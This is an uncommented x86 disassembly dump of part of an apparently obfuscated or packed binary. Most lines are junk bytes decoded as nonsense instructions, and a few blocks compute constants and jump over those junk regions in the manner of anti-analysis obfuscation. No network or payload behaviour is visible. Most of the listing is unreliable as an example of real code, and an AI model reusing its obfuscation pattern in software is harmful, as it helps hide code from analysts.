  41a1fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1fe:	cmp    bh,BYTE PTR [edi-0x188d8620]
  41a204:	retfw  
  41a206:	cmp    eax,0x2bfd50cf
  41a20b:	mov    al,ds:0x375c2cc7
  41a210:	fnsave [edx+eax*8]
  41a213:	cdq    
  41a214:	sub    edi,DWORD PTR [esp+eiz*8+0x401acfdf]
  41a21b:	int    0x42
  41a21d:	shr    DWORD PTR [ebp+0x325d25e0],0x0
  41a224:	add    BYTE PTR [ecx-0x7eafdbbc],cl
  41a22a:	loope  0x41a270
  41a22c:	xor    eax,0x4c890000
  41a231:	and    al,0x54
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	imul   esi,DWORD PTR [edi],0x47
  41a2a3:	push   0x2b
  41a2a5:	lods   eax,DWORD PTR ds:[esi]
  41a2a6:	push   ss
  41a2a7:	sbb    BYTE PTR [edx+edx*1+0x63361818],bh
  41a2ae:	shl    BYTE PTR [esi],cl
  41a2b0:	cld    
  41a2b1:	push   ecx
  41a2b2:	mov    ch,0x72
  41a2b4:	lods   eax,DWORD PTR ds:[esi]
  41a2b5:	aad    0xe0
  41a2b7:	jge    0x41a2a1
  41a2b9:	addr16 pusha 
  41a2bb:	and    dl,BYTE PTR [eax]
  41a2bd:	jmp    0x41a2cb
  41a2bf:	scas   al,BYTE PTR es:[edi]
  41a2c0:	push   ds
  41a2c1:	je     0x41a2f8
  41a2c3:	test   eax,0x46f83d40
  41a2c8:	dec    ebx
  41a2c9:	in     al,dx
  41a2ca:	jne    0x41a277
  41a2cc:	outs   dx,BYTE PTR ds:[esi]
  41a2cd:	scas   al,BYTE PTR es:[di]
  41a2cf:	or     esp,DWORD PTR [edi+0x7a]
  41a2d2:	mov    bh,BYTE PTR [edx]
  41a2d4:	pop    ecx
  41a2d5:	push   eax
  41a2d6:	sub    BYTE PTR [eax+0x40],0xde
  41a2da:	jmp    0x41a321
  41a2dc:	leave  
  41a2dd:	push   es
  41a2de:	fst    DWORD PTR [eax]
  41a2e0:	dec    edx
  41a2e1:	xor    bh,BYTE PTR [edi]
  41a2e3:	add    BYTE PTR [edi-0x14],dh
  41a2e6:	inc    ebx
  41a2e7:	out    0x98,al
  41a2e9:	and    eax,eax
  41a2eb:	pop    edi
  41a2ec:	or     BYTE PTR [ebx-0x6f],0x1d
  41a2f0:	retf   
  41a2f1:	fwait
  41a2f2:	pop    ecx
  41a2f3:	or     al,0xcd
  41a2f5:	mov    cl,0x32
  41a2f7:	mov    edi,0x8a59ecf9
  41a2fc:	push   esp
  41a2fd:	push   ebx
  41a2fe:	xor    al,0xae
  41a300:	push   0x8
  41a302:	sbb    eax,0x87e1d288
  41a307:	xchg   esi,eax
  41a308:	pop    eax
  41a309:	jae    0x41a2c5
  41a30b:	or     bh,dl
  41a30d:	clc    
  41a30e:	jmp    0x2ba5a937
  41a313:	sti    
  41a314:	scas   eax,DWORD PTR es:[edi]
  41a315:	add    eax,0x614324aa
  41a31a:	pop    es
  41a31b:	fisttp WORD PTR [ebx+0x3dccb6d5]
  41a321:	popf   
  41a322:	push   edx
  41a323:	jno    0x41a349
  41a325:	scas   al,BYTE PTR es:[edi]
  41a326:	jmp    0x41a3a5
  41a328:	or     al,0x52
  41a32a:	mov    bl,0x31
  41a32c:	xor    DWORD PTR [eax],esp
  41a32e:	vpavgw xmm6,xmm2,XMMWORD PTR [esp+ebx*8+0x3e5956a4]
  41a337:	dec    edi
  41a338:	mov    ebp,0x7211174b
  41a33d:	jecxz  0x41a35c
  41a33f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a340:	shl    DWORD PTR ds:0x75de3ff4,cl
  41a346:	(bad)  
  41a347:	jns    0x41a375
  41a349:	jle    0x41a32b
  41a34b:	mov    edi,0x128dd3ed
  41a350:	jmp    0x41a337
  41a352:	mov    al,ds:0x25311194
  41a357:	or     cl,BYTE PTR [eax-0x3b3e8496]
  41a35d:	sub    dh,dh
  41a35f:	pop    eax
  41a360:	push   ebx
  41a361:	cmp    eax,0x1bcce2b7
  41a366:	push   esp
  41a367:	into   
  41a368:	nop
  41a369:	mov    al,0xef
  41a36b:	addr16 and bh,dh
  41a36e:	sub    DWORD PTR [edi-0x33233cad],0xa4d3d167
  41a378:	mov    eax,ds:0x68375e0d
  41a37d:	iret   
  41a37e:	addr16 and al,0x83
  41a381:	jmp    0x57d4:0x1a4925d8
  41a388:	jbe    0x41a33a
  41a38a:	mov    esp,0x8d430d1
  41a38f:	repnz sar DWORD PTR [ebp+0x9a294d7],0xbb
  41a397:	int    0xf2
  41a399:	dec    esi
  41a39a:	add    ecx,DWORD PTR [ecx]
  41a39c:	bound  ebp,QWORD PTR [edx+0x6cd0747d]
  41a3a2:	ds popf 
  41a3a4:	push   0x682a8091
  41a3a9:	xchg   DWORD PTR [ebp+ebx*8-0x32],eax
  41a3ad:	mov    ch,0xc0
  41a3af:	out    dx,al
  41a3b0:	push   es
  41a3b1:	xor    ch,bl
  41a3b3:	inc    esi
  41a3b4:	dec    ecx
  41a3b5:	fidiv  DWORD PTR [ebp-0x1a86c42]
  41a3bb:	inc    eax
  41a3bc:	jnp    0x41a3bc
  41a3be:	test   BYTE PTR [eax+ecx*8],al
  41a3c1:	pop    es
  41a3c2:	sbb    al,0x24
  41a3c4:	pop    es
  41a3c5:	pop    ebx
  41a3c6:	pop    ebx
  41a3c7:	push   esp
  41a3c8:	dec    esi
  41a3c9:	adc    dl,BYTE PTR [esi+0x57]
  41a3cc:	mov    ecx,0x364f9e4d
  41a3d1:	and    edx,eax
  41a3d3:	cmc    
  41a3d4:	push   ecx
  41a3d5:	lahf   
  41a3d6:	push   0xffffffac
  41a3d8:	lock (bad) 
  41a3da:	mov    edi,?
  41a3dc:	ins    BYTE PTR es:[edi],dx
  41a3dd:	mov    BYTE PTR [edi-0x74a9184b],cl
  41a3e3:	fcmovu st,st(2)
  41a3e5:	xor    DWORD PTR [eax],esi
  41a3e7:	lods   eax,DWORD PTR ds:[esi]
  41a3e8:	test   al,0x39
  41a3ea:	das    
  41a3eb:	imul   ecx,DWORD PTR [ebp-0x6],0x50ed8bdc
  41a3f2:	aaa    
  41a3f3:	ret    0x5c81
  41a3f6:	ret    0xf2ad
  41a3f9:	push   es
  41a3fa:	rcr    BYTE PTR [edx-0x53],cl
  41a3fd:	mov    dh,0xf2
  41a3ff:	stos   DWORD PTR es:[edi],eax
  41a400:	out    dx,al
  41a401:	cmc    
  41a402:	cmp    al,0xb3
  41a404:	fucompp 
  41a406:	dec    eax
  41a407:	xor    edx,DWORD PTR [eax-0x772536d3]
  41a40d:	pop    es
  41a40e:	sahf   
  41a40f:	add    al,BYTE PTR [eax]
  41a411:	and    ch,BYTE PTR [ebp+0x18]
  41a414:	cmc    
  41a415:	or     dl,BYTE PTR [esi+ebp*4]
  41a418:	xor    edx,DWORD PTR [esi]
  41a41a:	adc    eax,0x4368c5d2
  41a41f:	pop    ecx
  41a420:	test   al,0xc1
  41a422:	inc    esi
  41a423:	imul   esi,DWORD PTR [ecx-0x77],0x1bca36eb
  41a42a:	mov    eax,eax
  41a42c:	daa    
  41a42d:	mov    cl,0x7
  41a42f:	rcl    bh,1
  41a431:	push   ecx
  41a432:	pop    esp
  41a433:	mov    ds,eax
  41a435:	std    
  41a436:	adc    DWORD PTR [eax+0x6c4cf81],edx
  41a43c:	addr16 push ecx
  41a43e:	cmp    BYTE PTR ds:0x18dfd802,cl
  41a444:	jmp    FWORD PTR [eax+0x17e4f3a2]
  41a44a:	clc    
  41a44b:	ins    BYTE PTR es:[edi],dx
  41a44c:	aaa    
  41a44d:	test   al,0xbf
  41a44f:	pop    esp
  41a450:	sbb    eax,0x6870ef6d
  41a455:	mov    esp,cs
  41a457:	cmp    al,0x48
  41a459:	jge    0x41a432
  41a45b:	cmp    DWORD PTR [esi+edx*1],edi
  41a45e:	pop    ecx
  41a45f:	repz jle 0x41a468
  41a462:	mov    edx,0x91466eae
  41a467:	repnz sbb bl,dl
  41a46a:	test   DWORD PTR [edi-0x28],ebp
  41a46d:	repz es xchg esi,eax
  41a470:	adc    BYTE PTR [eax],cl
  41a472:	jge    0x41a459
  41a474:	sub    edx,DWORD PTR [edi]
  41a476:	gs shl ebx,cl
  41a479:	cmp    DWORD PTR [ecx-0x3c],0x43fbb687
  41a480:	jb     0x41a45d
  41a482:	mov    ebp,0x23a76b91
  41a487:	sti    
  41a488:	sub    eax,0xfa33843e
  41a48d:	out    dx,al
  41a48e:	cwde   
  41a48f:	xchg   ecx,eax
  41a490:	es push ecx
  41a492:	cli    
  41a493:	jns    0x41a50d
  41a495:	repnz dec esp
  41a497:	outs   dx,BYTE PTR ds:[esi]
  41a498:	cmp    ecx,DWORD PTR [ecx+0x51]
  41a49b:	test   BYTE PTR [ecx-0x9],0x34
  41a49f:	shr    BYTE PTR [ecx],1
  41a4a1:	shl    DWORD PTR ds:0x4ba4dc31,cl
  41a4a7:	aaa    
  41a4a8:	rcl    ebp,cl
  41a4aa:	jo     0x41a4bf
  41a4ac:	dec    esp
  41a4ad:	mov    WORD PTR [ebp+0x72],es
  41a4b0:	outs   dx,DWORD PTR ds:[esi]
  41a4b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4b2:	popf   
  41a4b3:	mov    bl,0x2a
  41a4b5:	in     eax,0xc0
  41a4b7:	and    al,bl
  41a4b9:	sbb    al,BYTE PTR [eax]
  41a4bb:	xchg   edi,eax
  41a4bc:	fdiv   QWORD PTR [edx+0x0]
  41a4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4c0:	and    ebx,ebx
  41a4c2:	jnp    0x41a4d1
  41a4c4:	xchg   ecx,eax
  41a4c5:	test   DWORD PTR [esi-0x1a],esp
  41a4c8:	bound  esp,QWORD PTR [esi]
  41a4ca:	mov    esi,0xfe6634d9
  41a4cf:	ja     0x41a462
  41a4d1:	es pop edx
  41a4d3:	dec    ecx
  41a4d4:	mov    ds:0x79215d6f,al
  41a4d9:	push   edx
  41a4da:	push   eax
  41a4db:	not    al
  41a4dd:	nop
  41a4de:	sub    BYTE PTR [ebx-0x6d],0xf2
  41a4e2:	sbb    BYTE PTR [esi+eiz*2-0x61],0x70
  41a4e7:	pop    ebp
  41a4e8:	lahf   
  41a4e9:	fild   DWORD PTR [edx-0x6d44633]
  41a4ef:	mov    bh,0x22
  41a4f1:	mov    eax,0xd5c1e756
  41a4f6:	in     eax,0x5a
  41a4f8:	fwait
  41a4f9:	retf   
  41a4fa:	xor    BYTE PTR [ecx+eax*2+0x76002ac0],bh
  41a501:	mov    edx,0xf8e64301
  41a506:	push   ecx
  41a507:	mov    ah,BYTE PTR [edx+ebx*8+0x1cbd3e48]
  41a50e:	fisub  WORD PTR [eax]
  41a510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a511:	adc    edx,esi
  41a513:	out    dx,al
  41a514:	outs   dx,DWORD PTR ds:[esi]
  41a515:	push   esi
  41a516:	mov    edi,DWORD PTR [edx+edx*1+0x5cb11eb3]
  41a51d:	inc    ebx
  41a51e:	inc    eax
  41a51f:	sub    eax,0x51c3306
  41a524:	mov    eax,ds:0x80d357c5
  41a529:	dec    esp
  41a52a:	inc    esp
  41a52b:	rcr    BYTE PTR [ecx],cl
  41a52d:	xchg   ecx,esi
  41a52f:	mov    bh,0x78
  41a531:	cdq    
  41a532:	popa   
  41a533:	jmp    0xac199812
  41a538:	loopne 0x41a4bd
  41a53a:	out    dx,al
  41a53b:	fdiv   DWORD PTR [esi]
  41a53e:	daa    
  41a53f:	je     0x41a50c
  41a541:	clc    
  41a542:	addr16 add edi,0xffffff94
  41a546:	and    bl,cl
  41a548:	mov    edx,0x11d2a01b
  41a54d:	out    dx,eax
  41a54e:	mov    ebp,0xea308575
  41a553:	mov    bh,0x8d
  41a555:	jg     0x41a5c7
  41a557:	bound  esi,QWORD PTR [eax]
  41a559:	xlat   BYTE PTR ds:[ebx]
  41a55a:	enter  0x6d40,0xe5
  41a55e:	push   0x5594bc6b
  41a563:	retf   0x3fb2
  41a566:	in     eax,dx
  41a567:	mov    esp,0x33d44575
  41a56c:	jne    0x41a5c9
  41a56e:	mov    dh,0x19
  41a570:	mov    al,ah
  41a572:	pop    es
  41a573:	fwait
  41a574:	adc    DWORD PTR [ebp+0x6f],edx
  41a577:	retf   
  41a578:	repz test BYTE PTR [esi-0x15],dl
  41a57c:	push   ebp
  41a57d:	lods   eax,DWORD PTR ds:[esi]
  41a57e:	xchg   ecx,eax
  41a57f:	(bad)  
  41a580:	es ds in eax,dx
  41a583:	std    
  41a584:	mov    bl,0xcb
  41a586:	sub    al,0x6a
  41a588:	aad    0x87
  41a58a:	gs aam 0x5
  41a58d:	loopne 0x41a584
  41a58f:	cmp    ebp,DWORD PTR [esi-0x15845c42]
  41a595:	inc    eax
  41a596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a597:	hlt    
  41a598:	jg     0x41a614
  41a59a:	mov    esp,0xe07d8a7f
  41a59f:	mov    bh,0x9
  41a5a1:	or     ch,dl
  41a5a3:	or     DWORD PTR [ecx+0x14],0xf7b887ff
  41a5aa:	mov    dh,0xad
  41a5ac:	stc    
  41a5ad:	lods   al,BYTE PTR ds:[esi]
  41a5ae:	xor    DWORD PTR [eax+0x2e],ebx
  41a5b1:	sbb    eax,0xacdabf0a
  41a5b6:	pop    ds
  41a5b7:	jecxz  0x41a590
  41a5b9:	(bad)  
  41a5ba:	sbb    dl,bl
  41a5bc:	jle    0x41a5a3
  41a5be:	sub    eax,DWORD PTR [esi]
  41a5c0:	cld    
  41a5c1:	mov    ebp,0x45b93d08
  41a5c6:	mov    al,0xf2
  41a5c8:	es repnz pop edx
  41a5cb:	dec    esi
  41a5cc:	rcr    dl,0x4
  41a5cf:	(bad)  
  41a5d1:	mov    esp,0x2f6e3cb5
  41a5d6:	aas    
  41a5d7:	jmp    0x50ed:0x71acd2d0
  41a5de:	std    
  41a5df:	inc    edx
  41a5e0:	je     0x41a587
  41a5e2:	sub    esp,DWORD PTR [ecx]
  41a5e4:	out    dx,al
  41a5e5:	sti    
  41a5e6:	test   eax,0x1279bda3
  41a5eb:	cmp    DWORD PTR [edx+0x74],ebp
  41a5ee:	iret   
  41a5ef:	fwait
  41a5f0:	sbb    eax,esp
  41a5f2:	mov    edi,0x95367959
  41a5f7:	int    0xce
  41a5f9:	test   al,0x50
  41a5fb:	int3   
  41a5fc:	xchg   ebx,eax
  41a5fd:	pop    es
  41a5fe:	inc    edi
  41a5ff:	vpaddsb xmm6,xmm5,XMMWORD PTR [edi]
  41a603:	jo     0x41a5e8
  41a605:	(bad)  
  41a607:	stos   BYTE PTR es:[edi],al
  41a608:	repnz sbb ch,BYTE PTR [ebx]
  41a60b:	sbb    al,0x70
  41a60d:	stos   BYTE PTR es:[edi],al
  41a60e:	or     BYTE PTR [edx-0x77d6ab1f],0xd1
  41a615:	jno    0x41a626
  41a617:	jg     0x41a5e7
  41a619:	mov    fs,WORD PTR [ecx+ebx*1]
  41a61c:	mov    ds:0x2e3911cd,eax
  41a621:	enter  0xa507,0xce
  41a625:	or     BYTE PTR [esi+0x1f],0x7b
  41a629:	mov    esi,ebx
  41a62b:	cmp    BYTE PTR [esi+0x2dd6ed63],cl
  41a631:	and    cl,bl
  41a633:	add    BYTE PTR [eax],0x4b
  41a636:	dec    esp
  41a637:	mov    WORD PTR [edx+0x6e036d82],ss
  41a63d:	iret   
  41a63e:	push   ss
  41a63f:	fs push es
  41a641:	hlt    
  41a642:	jb     0x41a62d
  41a644:	cld    
  41a645:	lds    ebp,FWORD PTR [eax+edx*4]
  41a648:	test   al,0x3e
  41a64a:	xor    bh,BYTE PTR [eax]
  41a64c:	or     al,0x0
  41a64e:	add    dl,dh
  41a650:	push   ebp
  41a651:	aaa    
  41a652:	in     eax,dx
  41a653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a654:	lods   eax,DWORD PTR ds:[esi]
  41a655:	adc    BYTE PTR [ebx+0x116d8ff5],ah
  41a65b:	imul   DWORD PTR [ebp+0x40]
  41a65e:	sub    eax,ecx
  41a660:	mov    ecx,DWORD PTR [esp+0x50]
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x4220b1
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	fs ds mov ebp,0x16a5cfb0
  41a74f:	sbb    BYTE PTR [edx+edx*1-0x386fe7e8],bh
  41a756:	sahf   
  41a757:	xor    DWORD PTR [ecx],eax
  41a759:	xor    eax,0x2989e25f
  41a75e:	cld    
  41a75f:	fimul  DWORD PTR [esi-0x63]
  41a762:	iret   
  41a763:	icebp  
  41a764:	jp     0x41a780
  41a766:	out    0x83,eax
  41a768:	rcl    DWORD PTR [ebp-0x65a223f3],cl
  41a76e:	pop    ebp
  41a76f:	push   esi
  41a770:	pavgw  mm6,QWORD PTR [ebp-0x7303a2e2]
  41a777:	enter  0x5391,0xfc
  41a77b:	push   ss
  41a77c:	sub    al,0xc9
  41a77e:	stos   BYTE PTR es:[edi],al
  41a77f:	push   edx
  41a780:	pop    esi
  41a781:	je     0x41a775
  41a783:	or     DWORD PTR [eax-0x4d535f2],edi
  41a789:	push   ebx
  41a78a:	mov    dl,0xba
  41a78c:	test   al,0xca
  41a78e:	lahf   
  41a78f:	push   edx
  41a790:	xchg   ebx,eax
  41a791:	xchg   edi,eax
  41a792:	inc    esp
  41a793:	mov    edx,0x396c1ee2
  41a798:	adc    al,0x2d
  41a79a:	iret   
  41a79b:	mov    ds:0xd7f5937d,eax
  41a7a0:	shld   DWORD PTR [edx-0x52],esi,cl
  41a7a4:	pop    eax
  41a7a5:	xor    eax,0xde0f727c
  41a7aa:	bound  esi,QWORD PTR [ebp-0x7bf6bc11]
  41a7b0:	jle    0x41a7c9
  41a7b2:	mov    bl,0xa4
  41a7b4:	gs icebp 
  41a7b6:	arpl   WORD PTR es:[edx+esi*4+0x35a0235],si
  41a7be:	(bad)  
  41a7bf:	jno    0x41a7a9
  41a7c1:	pushf  
  41a7c2:	xchg   esp,eax
  41a7c3:	mov    al,BYTE PTR [esi]
  41a7c5:	test   DWORD PTR [edx-0x48b29cce],ebx
  41a7cb:	in     eax,dx
  41a7cc:	std    
  41a7cd:	pop    ecx
  41a7ce:	jbe    0x41a753
  41a7d0:	push   ebx
  41a7d1:	call   0xa9be:0x25e3bdb1
  41a7d8:	cmp    edi,DWORD PTR [edx]
  41a7da:	xchg   BYTE PTR [esi+eax*4],ch
  41a7dd:	pop    ss
  41a7de:	popa   
  41a7df:	(bad)  
  41a7e0:	stos   BYTE PTR es:[edi],al
  41a7e1:	inc    ebx
  41a7e2:	in     al,0x86
  41a7e4:	out    dx,eax
  41a7e5:	leave  
  41a7e6:	xor    ecx,DWORD PTR [ecx+0x66]
  41a7e9:	jne    0x41a845
  41a7eb:	imul   ecx,DWORD PTR [eax],0xffffffa4
  41a7ee:	cli    
  41a7ef:	jge    0x41a79a
  41a7f1:	dec    ebp
  41a7f2:	mov    ds:0x44c16a67,al
  41a7f7:	dec    ecx
  41a7f8:	hlt    
  41a7f9:	push   ebx
  41a7fa:	rol    BYTE PTR [esi],1
  41a7fc:	xlat   BYTE PTR cs:[ebx]
  41a7fe:	int    0x67
  41a800:	mov    dh,0xa3
  41a802:	xchg   edi,eax
  41a803:	rcl    DWORD PTR [ebx-0x39],1
  41a806:	xchg   ecx,eax
  41a807:	pop    ebp
  41a808:	xchg   ecx,eax
  41a809:	les    edi,FWORD PTR [ebx+0x2b30f9a5]
  41a80f:	dec    ebx
  41a810:	mov    WORD PTR [ebx],?
  41a812:	sar    BYTE PTR [edi+edi*2-0x4454edeb],1
  41a819:	sub    eax,DWORD PTR [edx+0x6822c062]
  41a81f:	jnp    0x41a7c1
  41a821:	(bad)  
  41a822:	mov    eax,ds:0xa2805945
  41a827:	adc    eax,edi
  41a829:	xchg   edi,eax
  41a82a:	pop    es
  41a82b:	xor    BYTE PTR [esi+0x2906392],ch
  41a831:	pop    ds
  41a832:	out    0xf,al
  41a834:	scas   al,BYTE PTR es:[edi]
  41a835:	(bad)  
  41a836:	cli    
  41a837:	mov    fs,WORD PTR [ebx-0x3f0bbade]
  41a83d:	push   edi
  41a83e:	pop    ebx
  41a83f:	xor    BYTE PTR [edx],bl
  41a841:	cmp    cl,BYTE PTR [eax]
  41a843:	cmp    dh,BYTE PTR [esi-0x53]
  41a846:	mov    dh,0xae
  41a848:	test   eax,0xa8c40928
  41a84d:	inc    ecx
  41a84e:	mov    ah,0x23
  41a850:	mov    ecx,0xba75ccf4
  41a855:	out    dx,eax
  41a856:	mov    al,0xce
  41a858:	fs mov esp,0x3ce80b2e
  41a85e:	xor    dl,BYTE PTR [eax+0x23]
  41a861:	mov    esi,0x3446f5e3
  41a866:	push   0x8b3db7a5
  41a86b:	daa    
  41a86c:	jnp    0x41a84e
  41a86e:	mov    cl,al
  41a870:	xchg   cl,ah
  41a872:	fdivr  DWORD PTR [edi+0x2dabed45]
  41a878:	outs   dx,DWORD PTR ds:[esi]
  41a879:	xchg   bl,bl
  41a87b:	mov    ch,0x3a
  41a87d:	jge    0x41a86c
  41a87f:	or     edi,esi
  41a881:	dec    edi
  41a882:	jne    0x41a8af
  41a884:	inc    edi
  41a885:	ror    ecx,0xab
  41a888:	pop    esp
  41a889:	sbb    cl,bh
  41a88b:	jno    0x41a871
  41a88d:	sbb    DWORD PTR [esi+eax*1+0x9d1787],ecx
  41a894:	jnp    0x41a8b7
  41a896:	push   ss
  41a897:	pusha  
  41a898:	jo     0x41a862
  41a89a:	aaa    
  41a89b:	pop    ebx
  41a89c:	mov    bh,0x5c
  41a89e:	pop    ecx
  41a89f:	cs test eax,0xa21dfbac
  41a8a5:	fstp   TBYTE PTR [edx+0x68]
  41a8a8:	cmc    
  41a8a9:	adc    al,0xc
  41a8ab:	in     al,0xc7
  41a8ad:	jno    0x41a874
  41a8af:	lock mov ecx,0x81284808
  41a8b5:	jae    0x41a853
  41a8b7:	test   eax,0x45a30720
  41a8bc:	mov    ah,0x57
  41a8be:	cmp    dl,dh
  41a8c0:	lea    eax,[ebx]
  41a8c2:	sbb    eax,0xa4bfcf9a
  41a8c7:	out    0x7c,al
  41a8c9:	and    ecx,ebp
  41a8cb:	mov    edx,0x71f75f82
  41a8d0:	clc    
  41a8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d2:	jmp    0xde4faa37
  41a8d7:	cdq    
  41a8d8:	test   BYTE PTR [edi+edx*4+0x6e],cl
  41a8dc:	and    al,0x1
  41a8de:	out    dx,al
  41a8df:	test   al,0xba
  41a8e1:	xlat   BYTE PTR ds:[ebx]
  41a8e2:	mov    ecx,0x1beaa85c
  41a8e7:	(bad)  
  41a8e9:	add    eax,0x89db8ac0
  41a8ee:	pop    es
  41a8ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8f0:	mov    ch,0x74
  41a8f2:	clc    
  41a8f3:	mov    esp,0xda07b254
  41a8f8:	dec    esp
  41a8f9:	jmp    0x23107e90
  41a8fe:	in     eax,0xf8
  41a900:	dec    ebp
  41a901:	sub    ebp,esi
  41a903:	or     BYTE PTR ss:[ecx-0x4a],bh
  41a907:	sub    al,0xcb
  41a909:	cmp    al,0x7a
  41a90b:	xchg   DWORD PTR [edx+0xa341f7],ecx
  41a911:	mov    WORD PTR [ecx-0x75],cs
  41a914:	adc    dh,BYTE PTR [ebp-0x4]
  41a917:	mov    esi,0x85d923bb
  41a91c:	mov    dl,0x52
  41a91e:	pop    ecx
  41a91f:	repnz out 0x52,eax
  41a922:	jne    0x41a94a
  41a924:	and    bh,BYTE PTR [esi+ebx*2]
  41a927:	outs   dx,BYTE PTR ds:[esi]
  41a928:	jbe    0x41a921
  41a92a:	in     eax,dx
  41a92b:	shr    DWORD PTR [edi+0x542c873d],1
  41a931:	mov    ds:0xca143e31,al
  41a936:	int    0x8e
  41a938:	in     al,0x6b
  41a93a:	gs mov dh,0x12
  41a93d:	das    
  41a93e:	xchg   edi,eax
  41a93f:	jne    0x41a99b
  41a941:	cmp    DWORD PTR [ebx-0xf66ab3f],eax
  41a947:	xchg   ebx,eax
  41a948:	inc    ebp
  41a949:	mov    ds:0x149138f0,eax
  41a94e:	cmp    BYTE PTR [edx+0x76],ch
  41a951:	cmp    al,0xca
  41a953:	iret   
  41a954:	cmp    eax,0xc9a500a2
  41a959:	push   ds
  41a95a:	jge    0x41a990
  41a95c:	and    al,0x8d
  41a95e:	dec    edx
  41a95f:	push   ebx
  41a960:	cli    
  41a961:	and    eax,DWORD PTR [ebx+0x54f06c02]
  41a967:	pop    esi
  41a968:	in     al,dx
  41a969:	stc    
  41a96a:	jmp    0x41a98f
  41a96c:	fcmovnbe st,st(0)
  41a96e:	mov    al,ds:0xc7bc6d92
  41a973:	fwait
  41a974:	scas   eax,DWORD PTR es:[edi]
  41a975:	inc    ebp
  41a976:	and    ecx,ebx
  41a978:	popa   
  41a979:	push   ebx
  41a97a:	jmp    0xbcee:0x8ffe3be1
  41a981:	lea    edi,[esi-0x24]
  41a984:	(bad)  
  41a985:	rol    DWORD PTR [edx],1
  41a987:	ret    
  41a988:	test   ecx,esp
  41a98a:	mov    ah,0x96
  41a98c:	sahf   
  41a98d:	lahf   
  41a98e:	xor    eax,0x93d86765
  41a993:	ins    BYTE PTR es:[edi],dx
  41a994:	jg     0x41a9dc
  41a996:	push   eax
  41a997:	stos   BYTE PTR es:[edi],al
  41a998:	or     dl,BYTE PTR [ecx-0x6d]
  41a99b:	gs jnp 0x41a93d
  41a99e:	dec    eax
  41a99f:	cmp    BYTE PTR [ebx],bl
  41a9a1:	(bad)  
  41a9a2:	mov    ebx,0x6fc492d7
  41a9a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9a8:	dec    esi
  41a9a9:	xor    al,0x38
  41a9ab:	sbb    ebp,DWORD PTR [edi+eax*1-0x191bc22f]
  41a9b2:	inc    edi
  41a9b3:	test   esp,edx
  41a9b5:	scas   al,BYTE PTR es:[di]
  41a9b7:	out    0xf0,al
  41a9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9ba:	aaa    
  41a9bb:	and    BYTE PTR [eax],dl
  41a9bd:	inc    ebx
  41a9be:	fwait
  41a9bf:	sahf   
  41a9c0:	or     esp,DWORD PTR [eax+0x46]
  41a9c3:	std    
  41a9c4:	daa    
  41a9c5:	fs pop edi
  41a9c7:	lods   al,BYTE PTR ds:[esi]
  41a9c8:	repnz cmp al,0xc2
  41a9cb:	adc    DWORD PTR [edi+0xff5e34e],0x23
  41a9d2:	mov    BYTE PTR [esp+edx*8],0x79
